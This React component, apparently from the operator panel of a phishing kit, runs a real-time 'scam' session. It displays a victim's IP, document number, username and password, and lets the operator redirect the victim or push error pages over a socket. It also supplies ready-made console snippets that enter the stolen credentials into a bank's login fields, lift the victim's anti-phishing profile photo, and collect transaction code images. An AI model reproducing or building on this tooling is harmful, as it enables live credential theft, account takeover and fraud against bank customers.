import {Modal, ModalContent, ModalBody, ModalFooter, Button, ModalHeader, RadioGroup, Radio} from '@nextui-org/react';
import { useContext, useState } from 'react';
import { ErrorIconLive } from './Icons/ErrorIconLive';
import { RedirectIconLive } from './Icons/RedirectIconLive';
import {Snippet} from "@nextui-org/react";

import { ScamContext } from '../../../../../context/ScamContext';

export const  ModalActionLiveBag = ({bag, onClose, isOpen}) => {

  const [selectPageRedirect, setSelectPageRedirect] = useState('')
  const { socket } = useContext(ScamContext)
  
  const {ip, liveData, urlPage, nroDocument, username, password} = bag
  return (
      <Modal backdrop={'blur'} isOpen={isOpen} onClose={onClose} >
      <ModalContent>
        {(onClose) => (
          <>
            <ModalHeader className="flex flex-col gap-1">
              <>
              <p className='font-bold text-[24px]'>MODO TIEMPO REAL</p>
              <hr className='mt-2' />
              </>
            </ModalHeader>
            <ModalBody>
              <>
                  {
                  
                    liveData.map(({pageNow, textPage, urlPage}, i) => (
                      <div
                        variant="shadow"
                        key={i}
                        color={pageNow ? 'primary' : 'default'}
                      >

                        <div className={pageNow ? 'flex justify-between bg-primary-400 p-2 rounded' : 'flex justify-between p-2'}>
                          <span className={textPage === 'Terminar' ? 'bg-red-500 w-full p-2 text-center' : ''}>
                            {textPage}
                          </span>

                          <div className='flex gap-2'>
                            {textPage != 'Terminar' 
                            ? (
                              <>
                                {!pageNow ? (<RedirectIconLive onClose={onClose} urlPage={urlPage} ip={ip} socket={socket} textPage={textPage} />) : null }
                                <ErrorIconLive onClose={onClose} urlPage={urlPage} ip={ip} socket={socket} textPage={textPage} />
                              </>
                            ) : null}
                          </div>

                        </div>
                      </div>
                    ))
                    }
                    <p>Codigo para rellenar de manera rapida</p>
                  <Snippet codeString={`document.querySelector('#documento').value = '${nroDocument}'
document.querySelector('#u').value = '${username}'
document.querySelector('#p').value = '${password}'`} className='text-[10px]'>
                    <span>document.querySelector('#documento').value = '{nroDocument}'</span>
                    <span>document.querySelector('#u').value = '{`${username}`}'</span>
                    <span>document.querySelector('#p').value = '{password}'</span>
                  </Snippet>

                    <p>Codigo para foto anti-pishing</p>
                  <Snippet codeString={`document.querySelector('.profile-pic img[src]').src`} className='text-[10px]'>
                    <span>document.querySelector('.profile-pic img[src]').src</span>
                  </Snippet>


                    <p>Codigo para pedir foto de transacciones</p>
                  <Snippet codeString={`const codePhotoList = []
document.querySelectorAll('#contMet > section > table img[src]').forEach(e => codePhotoList.push(e.src))
codePhotoList`} className='text-[10px]'>
  
                    <span>const codePhotoList = []</span>
                    <span>{`const selectorQuery = '#contMet > section > table img[src]'`}</span>
                    <span>{`document.querySelectorAll(selectorQuery)`}</span>
                    <span>{`.forEach(e => codePhotoList.push(e.src))`}</span>
                    <span>{`codePhotoList`}</span>

                  </Snippet>
              </>
            </ModalBody>
            <ModalFooter>
            </ModalFooter>
          </>
        )}
      </ModalContent>
    </Modal>
  )
}